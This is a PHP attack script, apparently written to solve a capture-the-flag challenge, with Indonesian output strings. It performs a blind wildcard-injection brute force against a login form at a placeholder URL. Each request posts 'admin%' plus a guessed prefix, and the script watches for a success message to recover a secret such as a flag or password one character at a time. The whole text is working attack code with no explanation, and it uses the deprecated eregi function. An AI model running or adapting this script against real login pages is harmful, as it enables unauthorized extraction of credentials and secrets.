<?php 
		$url = 'linknya';
		
		foreach (range(1, 30) as $i) 
		{
			$status = "";
			if ( $status != true ) 
			{
				$content = "";
				if (file_get_contents("flag.txt") != null) 
				{
					$content = file_get_contents("flag.txt");
				}
					$specialchars 		= array('!','+','{','}',"-"," ",":","/");//etc
					// $specialchars 		= ["-","&","{","}","_",""];//etc
					// $alphabet = array('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','-','+','{','}');
					foreach (array_merge($specialchars,range('A','Z'), range('a','z'), range('0','9')) as $letter) 
					{
						$myvars = "username=admin%&dawet=".$content.$letter."%&submit";
						$ch = curl_init( $url );
						curl_setopt( $ch, CURLOPT_POST, 1);
						curl_setopt( $ch, CURLOPT_POSTFIELDS, $myvars);
						curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
						curl_setopt( $ch, CURLOPT_HEADER, 0);
						curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
						$response = curl_exec( $ch );

						if (eregi("N1ce, try more !", $response)) 
						{
							$status = true;
						}else{
							$status = false;
						}

						if ($status == true) {
							echo $letter."<<< BINGOOO ! \n";
							$current = file_get_contents('flag.txt');
							$current .= "".$letter;
							file_put_contents('flag.txt', $current);
							break;
						}

						else{
							echo $letter .':'.'bukan anu itu'."\n";
						} 
					}
					continue;
					$status = "";

			}
		}


?>
